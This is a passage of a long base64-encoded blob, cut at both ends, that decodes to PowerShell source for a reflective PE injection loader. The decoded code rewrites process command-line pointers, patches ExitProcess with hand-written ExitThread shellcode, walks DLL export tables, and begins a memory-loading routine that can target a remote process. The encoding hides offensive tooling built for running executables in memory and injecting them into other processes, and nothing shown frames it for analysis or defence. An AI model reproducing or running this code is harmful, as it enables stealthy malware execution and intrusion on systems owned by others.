3djbWRsbiIpCiAgICAgICAgICAgICAgICBbSW50UHRyXSRBQ21kTG5BZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkRGxsSGFuZGxlLCAiX2FjbWRsbiIpCiAgICAgICAgICAgICAgICBpZiAoJFdDbWRMbkFkZHIgLWVxIFtJbnRQdHJdOjpaZXJvIC1vciAkQUNtZExuQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIkVycm9yLCBjb3VsZG4ndCBmaW5kIF93Y21kbG4gb3IgX2FjbWRsbiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJE5ld0FDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJEV4ZUFyZ3VtZW50cykKICAgICAgICAgICAgICAgICROZXdXQ21kTG5QdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoJEV4ZUFyZ3VtZW50cykKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI01ha2UgYSBjb3B5IG9mIHRoZSBvcmlnaW5hbCBjaGFyKiBhbmQgd2NoYXJfdCogc28gdGhlc2UgdmFyaWFibGVzIGNhbiBiZSByZXR1cm5lZCBiYWNrIHRvIHRoZWlyIG9yaWdpbmFsIHN0YXRlCiAgICAgICAgICAgICAgICAkT3JpZ0FDbWRMblB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRBQ21kTG5BZGRyLCBbVHlwZV1bSW50UHRyXSkKICAgICAgICAgICAgICAgICRPcmlnV0NtZExuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFdDbWRMbkFkZHIsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgJE9yaWdBQ21kTG5QdHJTdG9yYWdlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAgICAgJE9yaWdXQ21kTG5QdHJTdG9yYWdlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQdHJTaXplKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE9yaWdBQ21kTG5QdHIsICRPcmlnQUNtZExuUHRyU3RvcmFnZSwgJGZhbHNlKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE9yaWdXQ21kTG5QdHIsICRPcmlnV0NtZExuUHRyU3RvcmFnZSwgJGZhbHNlKQogICAgICAgICAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEFDbWRMbkFkZHIsICRPcmlnQUNtZExuUHRyU3RvcmFnZSwgJFB0clNpemUpCiAgICAgICAgICAgICAgICAkUmV0dXJuQXJyYXkgKz0gLCgkV0NtZExuQWRkciwgJE9yaWdXQ21kTG5QdHJTdG9yYWdlLCAkUHRyU2l6ZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRBQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURSksIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzID0gJGZhbHNlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCROZXdBQ21kTG5QdHIsICRBQ21kTG5BZGRyLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRBQ21kTG5BZGRyLCBbVUludDMyXSRQdHJTaXplLCBbVUludDMyXSgkT2xkUHJvdGVjdEZsYWcpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFdDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE5ld1dDbWRMblB0ciwgJFdDbWRMbkFkZHIsICRmYWxzZSkKICAgICAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFdDbWRMbkFkZHIsIFtVSW50MzJdJFB0clNpemUsIFtVSW50MzJdKCRPbGRQcm90ZWN0RmxhZyksIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgIAogICAgICAgIAogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICAgICAjTmV4dCBvdmVyd3JpdGUgQ29yRXhpdFByb2Nlc3MgYW5kIEV4aXRQcm9jZXNzIHRvIGluc3RlYWQgRXhpdFRocmVhZC4gVGhpcyB3YXkgdGhlIGVudGlyZSBQb3dlcnNoZWxsIHByb2Nlc3MgZG9lc24ndCBkaWUgd2hlbiB0aGUgRVhFIGV4aXRzLgoKICAgICAgICAkUmV0dXJuQXJyYXkgPSBAKCkKICAgICAgICAkRXhpdEZ1bmN0aW9ucyA9IEAoKSAjQXJyYXkgb2YgZnVuY3Rpb25zIHRvIG92ZXJ3cml0ZSBzbyB0aGUgdGhyZWFkIGRvZXNuJ3QgZXhpdCB0aGUgcHJvY2VzcwogICAgICAgIAogICAgICAgICNDb3JFeGl0UHJvY2VzcyAoY29tcGlsZWQgaW4gdG8gdmlzdWFsIHN0dWRpbyBjKyspCiAgICAgICAgW0ludFB0cl0kTXNjb3JlZUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJtc2NvcmVlLmRsbCIpCiAgICAgICAgaWYgKCRNc2NvcmVlSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93ICJtc2NvcmVlIGhhbmRsZSBudWxsIgogICAgICAgIH0KICAgICAgICBbSW50UHRyXSRDb3JFeGl0UHJvY2Vzc0FkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRNc2NvcmVlSGFuZGxlLCAiQ29yRXhpdFByb2Nlc3MiKQogICAgICAgIGlmICgkQ29yRXhpdFByb2Nlc3NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDb3JFeGl0UHJvY2VzcyBhZGRyZXNzIG5vdCBmb3VuZCIKICAgICAgICB9CiAgICAgICAgJEV4aXRGdW5jdGlvbnMgKz0gJENvckV4aXRQcm9jZXNzQWRkcgogICAgICAgIAogICAgICAgICNFeGl0UHJvY2VzcyAod2hhdCBub24tbWFuYWdlZCBwcm9ncmFtcyB1c2UpCiAgICAgICAgW0ludFB0cl0kRXhpdFByb2Nlc3NBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJFeGl0UHJvY2VzcyIpCiAgICAgICAgaWYgKCRFeGl0UHJvY2Vzc0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkV4aXRQcm9jZXNzIGFkZHJlc3Mgbm90IGZvdW5kIgogICAgICAgIH0KICAgICAgICAkRXhpdEZ1bmN0aW9ucyArPSAkRXhpdFByb2Nlc3NBZGRyCiAgICAgICAgCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgZm9yZWFjaCAoJFByb2NFeGl0RnVuY3Rpb25BZGRyIGluICRFeGl0RnVuY3Rpb25zKQogICAgICAgIHsKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gJFByb2NFeGl0RnVuY3Rpb25BZGRyCiAgICAgICAgICAgICNUaGUgZm9sbG93aW5nIGlzIHRoZSBzaGVsbGNvZGUgKFNoZWxsY29kZTogRXhpdFRocmVhZC5hc20pOgogICAgICAgICAgICAjMzJiaXQgc2hlbGxjb2RlCiAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTEgPSBAKDB4YmIpCiAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTIgPSBAKDB4YzYsIDB4MDMsIDB4MDEsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4YmIpCiAgICAgICAgICAgICM2NGJpdCBzaGVsbGNvZGUgKFNoZWxsY29kZTogRXhpdFRocmVhZC5hc20pCiAgICAgICAgICAgIGlmICgkUHRyU2l6ZSAtZXEgOCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMSA9IEAoMHg0OCwgMHhiYikKICAgICAgICAgICAgICAgIFtCeXRlW11dJFNoZWxsY29kZTIgPSBAKDB4YzYsIDB4MDMsIDB4MDEsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YmIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMyA9IEAoMHhmZiwgMHhkMykKICAgICAgICAgICAgJFRvdGFsU2l6ZSA9ICRTaGVsbGNvZGUxLkxlbmd0aCArICRQdHJTaXplICsgJFNoZWxsY29kZTIuTGVuZ3RoICsgJFB0clNpemUgKyAkU2hlbGxjb2RlMy5MZW5ndGgKICAgICAgICAgICAgCiAgICAgICAgICAgIFtJbnRQdHJdJEV4aXRUaHJlYWRBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJFeGl0VGhyZWFkIikKICAgICAgICAgICAgaWYgKCRFeGl0VGhyZWFkQWRkciAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJFeGl0VGhyZWFkIGFkZHJlc3Mgbm90IGZvdW5kIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJFByb2NFeGl0RnVuY3Rpb25BZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAjTWFrZSBjb3B5IG9mIG9yaWdpbmFsIEV4aXRQcm9jZXNzIGJ5dGVzCiAgICAgICAgICAgICRFeGl0UHJvY2Vzc09yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkRXhpdFByb2Nlc3NPcmlnQnl0ZXNQdHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRSZXR1cm5BcnJheSArPSAsKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgJEV4aXRQcm9jZXNzT3JpZ0J5dGVzUHRyLCAkVG90YWxTaXplKQogICAgICAgICAgICAKICAgICAgICAgICAgI1dyaXRlIHRoZSBFeGl0VGhyZWFkIHNoZWxsY29kZSB0byBtZW1vcnkuIFRoaXMgc2hlbGxjb2RlIHdpbGwgd3JpdGUgMHgwMSB0byBFeGVEb25lQnl0ZVB0ciBhZGRyZXNzIChzbyBQUyBrbm93cyB0aGUgRVhFIGlzIGRvbmUpLCB0aGVuIAogICAgICAgICAgICAjICAgY2FsbCBFeGl0VGhyZWFkCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgKCRTaGVsbGNvZGUxLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEV4ZURvbmVCeXRlUHRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAsICRmYWxzZSkKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wICRQdHJTaXplCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgKCRTaGVsbGNvZGUyLkxlbmd0aCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEV4aXRUaHJlYWRBZGRyLCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAsICRmYWxzZSkKICAgICAgICAgICAgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wICRQdHJTaXplCiAgICAgICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUzIC1NZW1vcnlBZGRyZXNzICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcAoKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkUHJvY0V4aXRGdW5jdGlvbkFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgfQogICAgICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiAgICAgICAgV3JpdGUtT3V0cHV0ICRSZXR1cm5BcnJheQogICAgfQogICAgCiAgICAKICAgICNUaGlzIGZ1bmN0aW9uIHRha2VzIGFuIGFycmF5IG9mIGFycmF5cywgdGhlIGlubmVyIGFycmF5IG9mIGZvcm1hdCBAKCREZXN0QWRkciwgJFNvdXJjZUFkZHIsICRDb3VudCkKICAgICMgICBJdCBjb3BpZXMgQ291bnQgYnl0ZXMgZnJvbSBTb3VyY2UgdG8gRGVzdGluYXRpb24uCiAgICBGdW5jdGlvbiBDb3B5LUFycmF5T2ZNZW1BZGRyZXNzZXMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtBcnJheVtdXQogICAgICAgICRDb3B5SW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cwogICAgICAgICkKCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgZm9yZWFjaCAoJEluZm8gaW4gJENvcHlJbmZvKQogICAgICAgIHsKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIFZpcnR1YWxQcm90ZWN0IGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLm1lbWNweS5JbnZva2UoJEluZm9bMF0sICRJbmZvWzFdLCBbVUludDY0XSRJbmZvWzJdKSB8IE91dC1OdWxsCiAgICAgICAgICAgIAogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRJbmZvWzBdLCBbVUludDMyXSRJbmZvWzJdLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICB9CiAgICB9CgoKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMgICAgRlVOQ1RJT05TICAgIyMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgIEZ1bmN0aW9uIEdldC1NZW1vcnlQcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jdGlvbk5hbWUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgICRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgCiAgICAgICAgI0dldCB0aGUgZXhwb3J0IHRhYmxlCiAgICAgICAgaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5FeHBvcnRUYWJsZS5TaXplIC1lcSAwKQogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuIFtJbnRQdHJdOjpaZXJvCiAgICAgICAgfQogICAgICAgICRFeHBvcnRUYWJsZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRXhwb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCiAgICAgICAgJEV4cG9ydFRhYmxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEV4cG9ydFRhYmxlUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9FWFBPUlRfRElSRUNUT1JZKQogICAgICAgIAogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJEV4cG9ydFRhYmxlLk51bWJlck9mTmFtZXM7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICAjQWRkcmVzc09mTmFtZXMgaXMgYW4gYXJyYXkgb2YgcG9pbnRlcnMgdG8gc3RyaW5ncyBvZiB0aGUgbmFtZXMgb2YgdGhlIGZ1bmN0aW9ucyBleHBvcnRlZAogICAgICAgICAgICAkTmFtZU9mZnNldFB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkRXhwb3J0VGFibGUuQWRkcmVzc09mTmFtZXMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQzMl0pKSkKICAgICAgICAgICAgJE5hbWVQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE5hbWVPZmZzZXRQdHIsIFtUeXBlXVtVSW50MzJdKSkKICAgICAgICAgICAgJE5hbWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koJE5hbWVQdHIpCgogICAgICAgICAgICBpZiAoJE5hbWUgLWNlcSAkRnVuY3Rpb25OYW1lKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjQWRkcmVzc09mTmFtZU9yZGluYWxzIGlzIGEgdGFibGUgd2hpY2ggY29udGFpbnMgcG9pbnRzIHRvIGEgV09SRCB3aGljaCBpcyB0aGUgaW5kZXggaW4gdG8gQWRkcmVzc09mRnVuY3Rpb25zCiAgICAgICAgICAgICAgICAjICAgIHdoaWNoIGNvbnRhaW5zIHRoZSBvZmZzZXQgb2YgdGhlIGZ1bmN0aW9uIGluIHRvIHRoZSBETEwKICAgICAgICAgICAgICAgICRPcmRpbmFsUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lT3JkaW5hbHMgKyAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKSkKICAgICAgICAgICAgICAgICRGdW5jSW5kZXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JkaW5hbFB0ciwgW1R5cGVdW1VJbnQxNl0pCiAgICAgICAgICAgICAgICAkRnVuY09mZnNldEFkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZkZ1bmN0aW9ucyArICgkRnVuY0luZGV4ICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtVSW50MzJdKSkpCiAgICAgICAgICAgICAgICAkRnVuY09mZnNldCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRGdW5jT2Zmc2V0QWRkciwgW1R5cGVdW1VJbnQzMl0pCiAgICAgICAgICAgICAgICByZXR1cm4gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRGdW5jT2Zmc2V0KQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBbSW50UHRyXTo6WmVybwogICAgfQoKCiAgICBGdW5jdGlvbiBJbnZva2UtTWVtb3J5TG9hZExpYnJhcnkKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlICldCiAgICAgICAgW0J5dGVbXV0KICAgICAgICAkUEVCeXRlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFeGVBcmdzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFJlbW90ZVByb2NIYW5kbGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgICAgICBbQm9vbF0KICAgICAgICAkRm9yY2VBU0xSID0gJGZhbHNlCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQogICAgICAgIAogICAgICAgICNHZXQgV2luMzIgY29uc3RhbnRzIGFuZCBmdW5jdGlvbnMKICAgICAgICAkV2luMzJDb25zdGFudHMgPSBHZXQtV2luMzJDb25zdGFudHMKICAgICAgICAkV2luMzJGdW5jdGlvbnMgPSBHZXQtV2luMzJGdW5jdGlvbnMKICAgICAgICAkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCiAgICAgICAgCiAgICAgICAgJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKICAgICAgICBpZiAoKCRSZW1vdGVQcm9jSGFuZGxlIC1uZSAkbnVsbCkgLWFuZCAoJFJlbW90ZVByb2NIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICB7CiAgICAgICAgICAgICRSZW1vdGVMb2FkaW5nID0gJHRydWUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgI0dldCBiYXNpYyBQRSBpbmZvcm1hdGlvbgogICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldHRpbmcgYmFzaWMgUEUgaW5mb3JtYXRpb24gZnJvbSB0aGUgZmlsZSIKICAgICAgICAkUEVJbmZvID0gR2V0LVBFQmFzaWNJbmZvIC1QRUJ5dGVzICRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCiAgICAgICAgJE9yaWdpbmFsSW1hZ2VCYXNlID0gJFBFSW5mby5PcmlnaW5hbEltYWdlQmFzZQogICAgICAgICROWENvbXBhdGlibGUgPSAkdHJ1ZQogICAgICAgIGlmICgoJFBFSW5mby5EbGxDaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklN